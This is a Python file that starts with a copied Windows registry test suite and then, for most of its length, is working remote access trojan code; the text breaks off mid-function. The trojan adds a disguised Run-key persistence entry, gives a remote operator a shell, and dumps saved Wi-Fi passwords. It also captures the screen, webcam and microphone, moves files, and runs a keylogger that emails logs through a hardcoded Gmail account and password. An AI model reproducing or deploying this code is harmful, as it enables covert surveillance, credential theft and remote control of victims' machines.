import socket
from telnetlib import PRAGMA_HEARTBEAT
import time
import os
import platform
import subprocess
#from unittest.runner import TextTestResult
import pyttsx3
import sys, errno
import unittest
from test import support
import threading
from platform import machine
import pyautogui
import cv2
import pickle
import struct
import ctypes
import numpy 
import pyaudio
from email.mime.multipart import MIMEMultipart,MIMEBase
from email import encoders
from email.mime.text import MIMEText
import smtplib
from pynput.keyboard import Key, Listener
import ssl
import scipy.io.wavfile
import playsound
from pydub import AudioSegment
from pydub.playback import play

#Target Payload


#Winreg module source : Until Line 508
# Do this first so test will be skipped if module doesn't exist
support.import_module('winreg', required_on=['win'])
# Now import everything
from winreg import *

try:
    REMOTE_NAME = sys.argv[sys.argv.index("--remote")+1]
except (IndexError, ValueError):
    REMOTE_NAME = None

# tuple of (major, minor)
WIN_VER = sys.getwindowsversion()[:2]
# Some tests should only run on 64-bit architectures where WOW64 will be.
WIN64_MACHINE = True if machine() == "AMD64" else False

# Starting with Windows 7 and Windows Server 2008 R2, WOW64 no longer uses
# registry reflection and formerly reflected keys are shared instead.
# Windows 7 and Windows Server 2008 R2 are version 6.1. Due to this, some
# tests are only valid up until 6.1
HAS_REFLECTION = True if WIN_VER < (6, 1) else False

# Use a per-process key to prevent concurrent test runs (buildbot!) from
# stomping on each other.
test_key_base = "Python Test Key [%d] - Delete Me" % (os.getpid(),)
test_key_name = "SOFTWARE\\" + test_key_base
# On OS'es that support reflection we should test with a reflected key
test_reflect_key_name = "SOFTWARE\\Classes\\" + test_key_base

test_data = [
    ("Int Value",     45,                                      REG_DWORD),
    ("Qword Value",   0x1122334455667788,                      REG_QWORD),
    ("String Val",    "A string value",                        REG_SZ),
    ("StringExpand",  "The path is %path%",                    REG_EXPAND_SZ),
    ("Multi-string",  ["Lots", "of", "string", "values"],      REG_MULTI_SZ),
    ("Raw Data",      b"binary\x00data",                       REG_BINARY),
    ("Big String",    "x"*(2**14-1),                           REG_SZ),
    ("Big Binary",    b"x"*(2**14),                            REG_BINARY),
    # Two and three kanjis, meaning: "Japan" and "Japanese")
    ("Japanese 日本", "日本語", REG_SZ),
]

class BaseWinregTests(unittest.TestCase):

    def setUp(self):
        # Make sure that the test key is absent when the test
        # starts.
        self.delete_tree(HKEY_CURRENT_USER, test_key_name)

    def delete_tree(self, root, subkey):
        try:
            hkey = OpenKey(root, subkey, 0, KEY_ALL_ACCESS)
        except OSError:
            # subkey does not exist
            return
        while True:
            try:
                subsubkey = EnumKey(hkey, 0)
            except OSError:
                # no more subkeys
                break
            self.delete_tree(hkey, subsubkey)
        CloseKey(hkey)
        DeleteKey(root, subkey)

    def _write_test_data(self, root_key, subkeystr="sub_key",
                         CreateKey=CreateKey):
        # Set the default value for this key.
        SetValue(root_key, test_key_name, REG_SZ, "Default value")
        key = CreateKey(root_key, test_key_name)
        self.assertTrue(key.handle != 0)
        # Create a sub-key
        sub_key = CreateKey(key, subkeystr)
        # Give the sub-key some named values

        for value_name, value_data, value_type in test_data:
            SetValueEx(sub_key, value_name, 0, value_type, value_data)

        # Check we wrote as many items as we thought.
        nkeys, nvalues, since_mod = QueryInfoKey(key)
        self.assertEqual(nkeys, 1, "Not the correct number of sub keys")
        self.assertEqual(nvalues, 1, "Not the correct number of values")
        nkeys, nvalues, since_mod = QueryInfoKey(sub_key)
        self.assertEqual(nkeys, 0, "Not the correct number of sub keys")
        self.assertEqual(nvalues, len(test_data),
                         "Not the correct number of values")
        # Close this key this way...
        # (but before we do, copy the key as an integer - this allows
        # us to test that the key really gets closed).
        int_sub_key = int(sub_key)
        CloseKey(sub_key)
        try:
            QueryInfoKey(int_sub_key)
            self.fail("It appears the CloseKey() function does "
                      "not close the actual key!")
        except OSError:
            pass
        # ... and close that key that way :-)
        int_key = int(key)
        key.Close()
        try:
            QueryInfoKey(int_key)
            self.fail("It appears the key.Close() function "
                      "does not close the actual key!")
        except OSError:
            pass

    def _read_test_data(self, root_key, subkeystr="sub_key", OpenKey=OpenKey):
        # Check we can get default value for this key.
        val = QueryValue(root_key, test_key_name)
        self.assertEqual(val, "Default value",
                         "Registry didn't give back the correct value")

        key = OpenKey(root_key, test_key_name)
        # Read the sub-keys
        with OpenKey(key, subkeystr) as sub_key:
            # Check I can enumerate over the values.
            index = 0
            while 1:
                try:
                    data = EnumValue(sub_key, index)
                except OSError:
                    break
                self.assertEqual(data in test_data, True,
                                 "Didn't read back the correct test data")
                index = index + 1
            self.assertEqual(index, len(test_data),
                             "Didn't read the correct number of items")
            # Check I can directly access each item
            for value_name, value_data, value_type in test_data:
                read_val, read_typ = QueryValueEx(sub_key, value_name)
                self.assertEqual(read_val, value_data,
                                 "Could not directly read the value")
                self.assertEqual(read_typ, value_type,
                                 "Could not directly read the value")
        sub_key.Close()
        # Enumerate our main key.
        read_val = EnumKey(key, 0)
        self.assertEqual(read_val, subkeystr, "Read subkey value wrong")
        try:
            EnumKey(key, 1)
            self.fail("Was able to get a second key when I only have one!")
        except OSError:
            pass

        key.Close()

    def _delete_test_data(self, root_key, subkeystr="sub_key"):
        key = OpenKey(root_key, test_key_name, 0, KEY_ALL_ACCESS)
        sub_key = OpenKey(key, subkeystr, 0, KEY_ALL_ACCESS)
        # It is not necessary to delete the values before deleting
        # the key (although subkeys must not exist).  We delete them
        # manually just to prove we can :-)
        for value_name, value_data, value_type in test_data:
            DeleteValue(sub_key, value_name)

        nkeys, nvalues, since_mod = QueryInfoKey(sub_key)
        self.assertEqual(nkeys, 0, "subkey not empty before delete")
        self.assertEqual(nvalues, 0, "subkey not empty before delete")
        sub_key.Close()
        DeleteKey(key, subkeystr)

        try:
            # Shouldn't be able to delete it twice!
            DeleteKey(key, subkeystr)
            self.fail("Deleting the key twice succeeded")
        except OSError:
            pass
        key.Close()
        DeleteKey(root_key, test_key_name)
        # Opening should now fail!
        try:
            key = OpenKey(root_key, test_key_name)
            self.fail("Could open the non-existent key")
        except OSError: # Use this error name this time
            pass

    def _test_all(self, root_key, subkeystr="sub_key"):
        self._write_test_data(root_key, subkeystr)
        self._read_test_data(root_key, subkeystr)
        self._delete_test_data(root_key, subkeystr)

    def _test_named_args(self, key, sub_key):
        with CreateKeyEx(key=key, sub_key=sub_key, reserved=0,
                         access=KEY_ALL_ACCESS) as ckey:
            self.assertTrue(ckey.handle != 0)

        with OpenKeyEx(key=key, sub_key=sub_key, reserved=0,
                       access=KEY_ALL_ACCESS) as okey:
            self.assertTrue(okey.handle != 0)


class LocalWinregTests(BaseWinregTests):

    def test_registry_works(self):
        self._test_all(HKEY_CURRENT_USER)
        self._test_all(HKEY_CURRENT_USER, "日本-subkey")

    def test_registry_works_extended_functions(self):
        # Substitute the regular CreateKey and OpenKey calls with their
        # extended counterparts.
        # Note: DeleteKeyEx is not used here because it is platform dependent
        cke = lambda key, sub_key: CreateKeyEx(key, sub_key, 0, KEY_ALL_ACCESS)
        self._write_test_data(HKEY_CURRENT_USER, CreateKey=cke)

        oke = lambda key, sub_key: OpenKeyEx(key, sub_key, 0, KEY_READ)
        self._read_test_data(HKEY_CURRENT_USER, OpenKey=oke)

        self._delete_test_data(HKEY_CURRENT_USER)

    def test_named_arguments(self):
        self._test_named_args(HKEY_CURRENT_USER, test_key_name)
        # Use the regular DeleteKey to clean up
        # DeleteKeyEx takes named args and is tested separately
        DeleteKey(HKEY_CURRENT_USER, test_key_name)

    def test_connect_registry_to_local_machine_works(self):
        # perform minimal ConnectRegistry test which just invokes it
        h = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
        self.assertNotEqual(h.handle, 0)
        h.Close()
        self.assertEqual(h.handle, 0)

    def test_inexistant_remote_registry(self):
        connect = lambda: ConnectRegistry("abcdefghijkl", HKEY_CURRENT_USER)
        self.assertRaises(OSError, connect)

    def testExpandEnvironmentStrings(self):
        r = ExpandEnvironmentStrings("%windir%\\test")
        self.assertEqual(type(r), str)
        self.assertEqual(r, os.environ["windir"] + "\\test")

    def test_context_manager(self):
        # ensure that the handle is closed if an exception occurs
        try:
            with ConnectRegistry(None, HKEY_LOCAL_MACHINE) as h:
                self.assertNotEqual(h.handle, 0)
                raise OSError
        except OSError:
            #self.assertEqual(h.handle, 0)
            pass

    def test_changing_value(self):
        # Issue2810: A race condition in 2.6 and 3.1 may cause
        # EnumValue or QueryValue to raise "WindowsError: More data is
        # available"
        done = False

        class VeryActiveThread(threading.Thread):
            def run(self):
                with CreateKey(HKEY_CURRENT_USER, test_key_name) as key:
                    use_short = True
                    long_string = 'x'*2000
                    while not done:
                        s = 'x' if use_short else long_string
                        use_short = not use_short
                        SetValue(key, 'changing_value', REG_SZ, s)

        thread = VeryActiveThread()
        thread.start()
        try:
            with CreateKey(HKEY_CURRENT_USER,
                           test_key_name+'\\changing_value') as key:
                for _ in range(1000):
                    num_subkeys, num_values, t = QueryInfoKey(key)
                    for i in range(num_values):
                        name = EnumValue(key, i)
                        QueryValue(key, name[0])
        finally:
            done = True
            thread.join()
            DeleteKey(HKEY_CURRENT_USER, test_key_name+'\\changing_value')
            DeleteKey(HKEY_CURRENT_USER, test_key_name)

    def test_long_key(self):
        # Issue2810, in 2.6 and 3.1 when the key name was exactly 256
        # characters, EnumKey raised "WindowsError: More data is
        # available"
        name = 'x'*256
        try:
            with CreateKey(HKEY_CURRENT_USER, test_key_name) as key:
                SetValue(key, name, REG_SZ, 'x')
                num_subkeys, num_values, t = QueryInfoKey(key)
                EnumKey(key, 0)
        finally:
            DeleteKey(HKEY_CURRENT_USER, '\\'.join((test_key_name, name)))
            DeleteKey(HKEY_CURRENT_USER, test_key_name)

    def test_dynamic_key(self):
        # Issue2810, when the value is dynamically generated, these
        # raise "WindowsError: More data is available" in 2.6 and 3.1
        try:
            EnumValue(HKEY_PERFORMANCE_DATA, 0)
        except OSError as e:
            if e.errno in (errno.EPERM, errno.EACCES):
                self.skipTest("access denied to registry key "
                              "(are you running in a non-interactive session?)")
            raise
        QueryValueEx(HKEY_PERFORMANCE_DATA, "")

    # Reflection requires XP x64/Vista at a minimum. XP doesn't have this stuff
    # or DeleteKeyEx so make sure their use raises NotImplementedError
    @unittest.skipUnless(WIN_VER < (5, 2), "Requires Windows XP")
    def test_reflection_unsupported(self):
        try:
            with CreateKey(HKEY_CURRENT_USER, test_key_name) as ck:
                self.assertNotEqual(ck.handle, 0)

            key = OpenKey(HKEY_CURRENT_USER, test_key_name)
            self.assertNotEqual(key.handle, 0)

            with self.assertRaises(NotImplementedError):
                DisableReflectionKey(key)
            with self.assertRaises(NotImplementedError):
                EnableReflectionKey(key)
            with self.assertRaises(NotImplementedError):
                QueryReflectionKey(key)
            with self.assertRaises(NotImplementedError):
                DeleteKeyEx(HKEY_CURRENT_USER, test_key_name)
        finally:
            DeleteKey(HKEY_CURRENT_USER, test_key_name)

    def test_setvalueex_value_range(self):
        # Test for Issue #14420, accept proper ranges for SetValueEx.
        # Py2Reg, which gets called by SetValueEx, was using PyLong_AsLong,
        # thus raising OverflowError. The implementation now uses
        # PyLong_AsUnsignedLong to match DWORD's size.
        try:
            with CreateKey(HKEY_CURRENT_USER, test_key_name) as ck:
                self.assertNotEqual(ck.handle, 0)
                SetValueEx(ck, "test_name", None, REG_DWORD, 0x80000000)
        finally:
            DeleteKey(HKEY_CURRENT_USER, test_key_name)

    def test_queryvalueex_return_value(self):
        # Test for Issue #16759, return unsigned int from QueryValueEx.
        # Reg2Py, which gets called by QueryValueEx, was returning a value
        # generated by PyLong_FromLong. The implementation now uses
        # PyLong_FromUnsignedLong to match DWORD's size.
        try:
            with CreateKey(HKEY_CURRENT_USER, test_key_name) as ck:
                self.assertNotEqual(ck.handle, 0)
                test_val = 0x80000000
                SetValueEx(ck, "test_name", None, REG_DWORD, test_val)
                ret_val, ret_type = QueryValueEx(ck, "test_name")
                self.assertEqual(ret_type, REG_DWORD)
                self.assertEqual(ret_val, test_val)
        finally:
            DeleteKey(HKEY_CURRENT_USER, test_key_name)

    def test_setvalueex_crash_with_none_arg(self):
        # Test for Issue #21151, segfault when None is passed to SetValueEx
        try:
            with CreateKey(HKEY_CURRENT_USER, test_key_name) as ck:
                self.assertNotEqual(ck.handle, 0)
                test_val = None
                SetValueEx(ck, "test_name", 0, REG_BINARY, test_val)
                ret_val, ret_type = QueryValueEx(ck, "test_name")
                self.assertEqual(ret_type, REG_BINARY)
                self.assertEqual(ret_val, test_val)
        finally:
            DeleteKey(HKEY_CURRENT_USER, test_key_name)

    def test_read_string_containing_null(self):
        # Test for issue 25778: REG_SZ should not contain null characters
        try:
            with CreateKey(HKEY_CURRENT_USER, test_key_name) as ck:
                self.assertNotEqual(ck.handle, 0)
                test_val = "A string\x00 with a null"
                SetValueEx(ck, "test_name", 0, REG_SZ, test_val)
                ret_val, ret_type = QueryValueEx(ck, "test_name")
                self.assertEqual(ret_type, REG_SZ)
                self.assertEqual(ret_val, "A string")
        finally:
            DeleteKey(HKEY_CURRENT_USER, test_key_name)


@unittest.skipUnless(REMOTE_NAME, "Skipping remote registry tests")
class RemoteWinregTests(BaseWinregTests):

    def test_remote_registry_works(self):
        remote_key = ConnectRegistry(REMOTE_NAME, HKEY_CURRENT_USER)
        self._test_all(remote_key)


@unittest.skipUnless(WIN64_MACHINE, "x64 specific registry tests")
class Win64WinregTests(BaseWinregTests):

    def test_named_arguments(self):
        self._test_named_args(HKEY_CURRENT_USER, test_key_name)
        # Clean up and also exercise the named arguments
        DeleteKeyEx(key=HKEY_CURRENT_USER, sub_key=test_key_name,
                    access=KEY_ALL_ACCESS, reserved=0)

    def test_reflection_functions(self):
        # Test that we can call the query, enable, and disable functions
        # on a key which isn't on the reflection list with no consequences.
        with OpenKey(HKEY_LOCAL_MACHINE, "Software") as key:
            # HKLM\Software is redirected but not reflected in all OSes
            self.assertTrue(QueryReflectionKey(key))
            self.assertIsNone(EnableReflectionKey(key))
            self.assertIsNone(DisableReflectionKey(key))
            self.assertTrue(QueryReflectionKey(key))

    @unittest.skipUnless(HAS_REFLECTION, "OS doesn't support reflection")
    def test_reflection(self):
        # Test that we can create, open, and delete keys in the 32-bit
        # area. Because we are doing this in a key which gets reflected,
        # test the differences of 32 and 64-bit keys before and after the
        # reflection occurs (ie. when the created key is closed).
        try:
            with CreateKeyEx(HKEY_CURRENT_USER, test_reflect_key_name, 0,
                             KEY_ALL_ACCESS | KEY_WOW64_32KEY) as created_key:
                self.assertNotEqual(created_key.handle, 0)

                # The key should now be available in the 32-bit area
                with OpenKey(HKEY_CURRENT_USER, test_reflect_key_name, 0,
                             KEY_ALL_ACCESS | KEY_WOW64_32KEY) as key:
                    self.assertNotEqual(key.handle, 0)

                # Write a value to what currently is only in the 32-bit area
                SetValueEx(created_key, "", 0, REG_SZ, "32KEY")

                # The key is not reflected until created_key is closed.
                # The 64-bit version of the key should not be available yet.
                open_fail = lambda: OpenKey(HKEY_CURRENT_USER,
                                            test_reflect_key_name, 0,
                                            KEY_READ | KEY_WOW64_64KEY)
                self.assertRaises(OSError, open_fail)

            # Now explicitly open the 64-bit version of the key
            with OpenKey(HKEY_CURRENT_USER, test_reflect_key_name, 0,
                         KEY_ALL_ACCESS | KEY_WOW64_64KEY) as key:
                self.assertNotEqual(key.handle, 0)
                # Make sure the original value we set is there
                self.assertEqual("32KEY", QueryValue(key, ""))
                # Set a new value, which will get reflected to 32-bit
                SetValueEx(key, "", 0, REG_SZ, "64KEY")

            # Reflection uses a "last-writer wins policy, so the value we set
            # on the 64-bit key should be the same on 32-bit
            with OpenKey(HKEY_CURRENT_USER, test_reflect_key_name, 0,
                         KEY_READ | KEY_WOW64_32KEY) as key:
                self.assertEqual("64KEY", QueryValue(key, ""))
        finally:
            DeleteKeyEx(HKEY_CURRENT_USER, test_reflect_key_name,
                        KEY_WOW64_32KEY, 0)

    @unittest.skipUnless(HAS_REFLECTION, "OS doesn't support reflection")
    def test_disable_reflection(self):
        # Make use of a key which gets redirected and reflected
        try:
            with CreateKeyEx(HKEY_CURRENT_USER, test_reflect_key_name, 0,
                             KEY_ALL_ACCESS | KEY_WOW64_32KEY) as created_key:
                # QueryReflectionKey returns whether or not the key is disabled
                disabled = QueryReflectionKey(created_key)
                self.assertEqual(type(disabled), bool)
                # HKCU\Software\Classes is reflected by default
                self.assertFalse(disabled)

                DisableReflectionKey(created_key)
                self.assertTrue(QueryReflectionKey(created_key))

            # The key is now closed and would normally be reflected to the
            # 64-bit area, but let's make sure that didn't happen.
            open_fail = lambda: OpenKeyEx(HKEY_CURRENT_USER,
                                          test_reflect_key_name, 0,
                                          KEY_READ | KEY_WOW64_64KEY)
            self.assertRaises(OSError, open_fail)

            # Make sure the 32-bit key is actually there
            with OpenKeyEx(HKEY_CURRENT_USER, test_reflect_key_name, 0,
                           KEY_READ | KEY_WOW64_32KEY) as key:
                self.assertNotEqual(key.handle, 0)
        finally:
            DeleteKeyEx(HKEY_CURRENT_USER, test_reflect_key_name,
                        KEY_WOW64_32KEY, 0)

    def test_exception_numbers(self):
        with self.assertRaises(FileNotFoundError) as ctx:
            QueryValue(HKEY_CLASSES_ROOT, 'some_value_that_does_not_exist')

def test_main():
    support.run_unittest(LocalWinregTests, RemoteWinregTests,
                         Win64WinregTests)

if __name__ == "__main__":
    if not REMOTE_NAME:
        print("Remote registry calls can be tested using",
              "'test_winreg.py --remote \\\\machine_name'")
    test_main()


#source End

#start
def always_Main():
      #Demo Function 
      #The problem is The Neo file don't copy in dive C but it Copy in Other Drives
 strline = " \ "
 rep = strline.replace(" ","")
 name = "LionTP.exe"
 line = os.getcwd()
 rep = strline.replace(" ","")
 way = line+rep+name
 value=r'Software\Microsoft\Windows\CurrentVersion\Run'
 try:
       key = OpenKey(HKEY_CURRENT_USER,value,0,KEY_ALL_ACCESS)    
 except: 
       key = CreateKeyEx(HKEY_CURRENT_USER,value)

 SetValueEx(key,"nvvsvc",0,REG_SZ,way)
 CloseKey(key)

#always_Main()#completed and ok function

#always functions is about runnig script forever even when the computer restart 
def always1():
      #Demo Function 
      #The problem is The Neo file don't copy in dive C but it Copy in Other Drives
 strline = " \ "
 rep = strline.replace(" ","")
 zero = "C:\Windows\System32"+rep+"neeo.py"
 with open("neo3.py","rb") as main_way :
       with open(zero,"wb") as main_item :
             main_item.write(main_way.read())
 name = "neo3.py"
 line = os.getcwd()
 rep = strline.replace(" ","")
 way = line+rep+name
 value=r'Software\Microsoft\Windows\CurrentVersion\Run'
 try:
       key = OpenKey(HKEY_CURRENT_USER,value,0,KEY_ALL_ACCESS)
 except: 
       key = CreateKey(HKEY_CURRENT_USER,value)

 SetValueEx(key,"nvvsvc",0,REG_SZ,way)
 CloseKey(key)
#always1()
def start():
      # this function is connect to def wifi information for runnig adminstrator cmd but it don't work 
 value = r'Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers'
 try :
       key = OpenKey(HKEY_CURRENT_USER,value,0,KEY_ALL_ACCESS)
         
 except : 
       key = CreateKey(HKEY_CURRENT_USER,value)

 SetValueEx(key,"C:\Windows\System32\cmd.exe",0,REG_SZ,"RUNASADMIN")
 CloseKey(key)
#start()
def Restart():  
          con.send(b'1')
          time = con.recv(1024)
          int_time = time.decode("utf-8")
          os.system("shutdown /r /t "+str(int_time))
          con.send(b'1')
          
def Shutdown():
          con.send(b'1')
          time = con.recv(1024)
          int_time = time.decode("utf-8")
          os.system("shutdown /s /t "+str(int_time))  
          con.send(b'1')

def  Logoff():
        con.send(b'1')
        time = con.recv(1024)
        nt_time = time.decode("utf-8")
        os.system("shutdown /l /t "+str(nt_time))
        con.send(b'1')

def Play_Voice():
    con.send(b'1')
    while True :
          text0 = con.recv(2020)
          con.send(b'1')
          text = str(text0.decode("utf-8"))
          if text=='0()':
              con.send(b'1')
              break
          saying = pyttsx3.init()
          saying.setProperty("rate",150)
          saying.say(text)     
          saying.runAndWait() 
 
def Wifi_Info():
        while True :
            try :
                print('1')
                wifi_Info = subprocess.check_output("netsh wlan show profiles",shell=True)
                print('2')
                wifi_Info1 = str(wifi_Info.decode("utf-8"))
                print('3')
                Info= bytes(wifi_Info1,'utf-8')
                con.send(Info)
                print('4')
                name0 = con.recv(1024)
                print('5')
                name= str(name0.decode("utf-8"))
                if name=='0ex()0':
                    con.send(b'1')
                    break
                main_Info = subprocess.check_output('netsh wlan show profiles "'+name+'" key=clear',shell=True)
                print('6')
                main_Info0 = str(main_Info.decode('utf-8'))
                print('7')
                code_Info = bytes(main_Info0,"utf-8")
                con.send(code_Info)
                print('8')
                con.recv(12)
            except:
                print('error')
                con.send(b'0error0')
                con.recv(12)

def Drive():
      drives=[]
      drives_name = ['A:','B:','C:','D:','E:','F:','G:','H:','I:','J:','K:','L:','M:','N:','O:','P:','Q:','R:','S:','T:','U:','V:','W:','X:','Y:','Z:']
      com = subprocess.check_output("net share",shell=True)
      com2=str(com.decode("utf-8"))
      for c in drives_name :
            if c in com2:
              drives.append(c)

      names = str(drives)
      bcon=bytes(names,"utf-8")
      con.send(bcon)

def osing():
        Drive()
        con.recv(1024)
        while True :
          #print("os")
          pathing = os.getcwd()+'>'
          path2=bytes(pathing,'utf-8')
          con.sendall(path2)
          data=con.recv(2048)
          data2=str(data.decode("utf-8"))
          if data2=='ex()' :
              con.send(b'1')
              break
          elif data2=='cls':
              continue
          elif data2=='-' :
              continue
          elif data2=='download()':
              #con.send(b'1')
              Download()
              con.recv(24)
              continue
          elif data2=='upload()':
              Uploade()
              con.recv(24)
              continue
          elif data2=='cd..':
              os.chdir("..")
              continue
          elif data2=='cd':
                 #print("5")
                 pith = os.getcwd()
                 value2=bytes(pith,'utf-8')
                 con.send(value2)
                 con.recv(24)  
                 continue
          elif  data2[0:2]=='cd':
             try :
                 os.chdir(data2[3:])
                 continue
             except:
                 #Devil Line 666
                 con.send(b'Not Directory')
                 continue
          try:
              shell = subprocess.check_output(data2,shell=True)
              value=str(shell.decode("utf-8"))
              if  value ==None or value=='':
                  con.send(b'Done')
                  con.recv(24)
                  continue
              value2=bytes(value,'utf-8')
              con.send(value2)
              con.recv(24)
          except:
              con.send(b'command is wrong')
              con.recv(24)
   
def More_Info():
    file = str(platform.uname()) + str(platform.architecture())
    #strfile = str(file)
    bfile = bytes(file,"utf-8")   
    con.send(bfile)

def screenshout():
    while True:
        image = pyautogui.screenshot()
        image.save('tpimage.png')
        data = open('tpimage.png', 'rb')
        file = data.read(2048)
        while file:
            con.send(file)
            file = data.read(2048)
        con.send(b'0hibye1')
        data.close()
        print("sended")
        bagain = con.recv(24)
        again = str(bagain.decode("utf-8"))
        if again=='1':
            continue
        elif again=='0':
            break
        else :
            break

def Capture_Camera():
    while True:
        camera= cv2.VideoCapture(0, cv2.CAP_DSHOW)
        return_value, image = camera.read()
        cv2.imwrite('camerapic'+'.png', image)
        del(camera)
        data = open('camerapic.png', 'rb')
        file = data.read(2048)
        while file:
            con.send(file)
            file = data.read(2048)
        con.send(b'0hibye1')
        data.close()
        print("sended")
        bagain = con.recv(24)
        again = str(bagain.decode("utf-8"))
        if again=='1':
            continue
        elif again=='0':
            break
        else:
            break
            

def Screen_Recorder():
    print("start")
    resolution = (1920, 1080)
    #print("0")
    codec = cv2.VideoWriter_fourcc(*"XVID")
   # print("002")
    filename = "Screen_Recording.avi"
    fps = 60.0
   # print("003")
    out = cv2.VideoWriter(filename, codec, fps, resolution)
   # print("004")
    #cv2.namedWindow("Live", cv2.WINDOW_NORMAL)
    #cv2.resizeWindow("Live", 480, 270)
    try :
        while True:
           # print("start while")
            img = pyautogui.screenshot()
            frame = numpy.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)
            #sframe = frame.read()
            a = pickle.dumps(frame)
            msg = struct.pack("Q",len(a))+a
            con.sendall(msg)
            #cv2.imshow('Live', frame)
            if cv2.waitKey(1) == ord('q'):
                break
            co = con.recv(12)
            if str(co.decode("utf-8"))=='0':
                break
    except:
        print("000error000")
        pass

    #out.release()
    #cv2.destroyAllWindows()

def Screen_Recorder_TP():
  data = b""
  payload_size = struct.calcsize("Q")
  while True :
      while len(data) < payload_size :
          packet = con.recv(4*1024)
          if not packet : break
          data +=packet
      packed_msg_size= data[:payload_size]
      data = data[payload_size:]
      msg_size = struct.unpack("Q",packed_msg_size)[0]
      while len(data) < msg_size :
          data += con.recv(4*1024)
      framedata = data[:msg_size]
      data = data[msg_size:]
      frame = pickle.loads(framedata)
      cv2.imshow("tp",frame)
      if cv2.waitKey(1) & 0xFF == ord('q'):
          break

def Record_Camera():
    try:
        vid = cv2.VideoCapture(0)
        while(vid.isOpened()):
            img, frame = vid.read()
            a = pickle.dumps(frame)
            msg = struct.pack("Q",len(a))+a
            print('-')
            con.sendall(msg)
            print('+')
            #o = con.recv(12)
            print("1")
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
            print("0")
           # if str(co.decode("utf-8"))=='0':
               # con.send(b'1')
                #break
    except:
        print("000error000")
        pass


def Voice_Recorder_online():
   con.send(b'sec')
   insecond = con.recv(124)
   RECORD_SECONDS = int(insecond.decode("utf-8"))
   FORMAT = pyaudio.paInt16
   CHUNK = 1024
   CHANNELS = 1
   RATE = 44100
   frames = []
   audio = pyaudio.PyAudio()
   while  True :
        audio = pyaudio.PyAudio()
        stream = audio.open(format=FORMAT, channels=CHANNELS,
                rate=RATE, input=True,
                frames_per_buffer=CHUNK)
        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(numpy.fromstring(data, dtype=numpy.int16))
        numpydata = numpy.hstack(frames)
        a = pickle.dumps(numpydata)
        frames=[]
        msg = struct.pack("Q",len(a))+a
        con.sendall(msg)
        #print('1')
        con.recv(12)
        #print('2')
        stream.stop_stream()
        stream.close()
        audio.terminate()

def Voice_Recorder_file():
   fs = 44100
   con.send(b'sec')
   insecond = con.recv(124)
   RECORD_SECONDS = int(insecond.decode("utf-8"))
   FORMAT = pyaudio.paInt16
   CHUNK = 1024
   CHANNELS = 1
   RATE = 44100
   frames = []
   audio = pyaudio.PyAudio()
   while True:
    stream = audio.open(format=FORMAT, channels=CHANNELS,
    rate=RATE, input=True,
    frames_per_buffer=CHUNK)
    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(numpy.fromstring(data, dtype=numpy.int16))
    numpydata = numpy.hstack(frames)
    a = pickle.dumps(numpydata)
    frames=[]
    msg = struct.pack("Q",len(a))+a
    #print(type(msg))
    print('1')
    con.sendall(msg)
    print('2')
    con.recv(24)
    print('3')
    con.send(b'1')
    stream.stop_stream()
    stream.close()
    audio.terminate()
    print('5')
    break
   

count = 0
keys = []
def Active_KeyLogger():
   msg = MIMEMultipart()
   msg['From'] = "neomainready@gmail.com"
   msg['Subject'] = "test"
   #count = 0
   #keys = []
   def keylog():
        def on_press(key):
            global keys,count
            keys.append(key)
            count += 1
            #print("{0} preesed".format(key))
            if count >= 10 :
                count = 0
                write_file(keys)
                keys = []
        def write_file(keys):
            with open("log.txt","a") as f:
                for key in keys:
                    k = str(key).replace("'","")
                    if k.find("space") > 0:
                        f.write('\n')
                    elif k.find("Key") == -1 :
                        f.write(k)
        def on_release(key):
            if key == Key.esc:
                return False
        with Listener(on_press=on_press,on_release=on_release) as listener:
            listener.join()

   def timezone():
        usermail = con.recv(1024)
        con.send(b'1')
        strusermail = str(usermail.decode('utf-8'))
        sec = con.recv(1024)
        strsec = str(sec.decode('utf-8'))
        intsec = int(strsec)
        password = "209ufuch297y17eyd"
        msg['From'] = "neomainready@gmail.com"
        msg['To'] = strusermail
        msg['Subject'] = "test"
        filename = "log.txt"
        while True :
            time.sleep(intsec)
            #txt = open("log.txt","r")
            #logs = txt.read()
            body = "Your Target Keyboard Logs "
            msg.attach(MIMEText(body, "plain"))
            with open(filename, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read()) 
            encoders.encode_base64(part)
            part.add_header(
                "Content-Disposition",
                f"attachment; filename= {filename}",
            )
            msg.attach(part)
            print("1")
            text = msg.as_string()
            print("2")
            context = ssl.create_default_context()
            print("3")
            with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                server.login(msg['From'], password)
                print("4")
                server.sendmail( msg['From'], msg['To'], text )
   threading.Thread(target=keylog).start()
   threading.Thread(target=timezone).start()

def Download():
    con.send(b'1')
    while True :
        #print('01')
        filepath = con.recv(2042)
        #print('02')
        sfilepath=str(filepath.decode("utf-8"))
        if sfilepath=='ex()':
            #print('03')
            con.send(b'1')
            break
        try :
            #print('04')
            data = open(sfilepath,'rb')
            file = data.read(2048)
            print('1')
        except :
            con.send(b'-')
            continue
        print('1.5')
        con.send(b'0download1')
        print('2')
        con.recv(12)
        print('3')
        while file:
            print('05')
            con.send(file)
            file = data.read(2048)
            #con.recv(24)
            print('06')
        con.send(b'opsl()')
        data.close()
        #print("sended")
        bagain = con.recv(24)
        #print("received")
        again = str(bagain.decode("utf-8"))
        if again=='y':
            con.send(b'0download1')
            continue
        elif again=='0':
            con.send(b'1')
            break
        else:
            con.send(b'1')
            break


def Change_Background():
    print("11111")
    con.send(b'1')
    file = open('pic.png','wb')
    data = con.recv(2048)
    print("start")
    while data :
        con.send(b'1')
        file.write(data)
        data = con.recv(2048) 
        if '0hibye1' in str(data.decode(errors='ignore')):
            str(data).replace('0hibye1','')
            file.write(data)
            break
        else:
            pass  
    file.close()
    con.send(b'end')
    print("1end1")
    way = str(os.getcwd())
    SPI_SETDESKWALLPAPER = 20
    WALLPAPER_PATH = way + r'\pic.png'


    def is_64_windows():
        """Find out how many bits is OS. """
        return struct.calcsize('P') * 8 == 64


    def get_sys_parameters_info():
        """Based on if this is 32bit or 64bit returns correct version of SystemParametersInfo function. """
        return ctypes.windll.user32.SystemParametersInfoW if is_64_windows() \
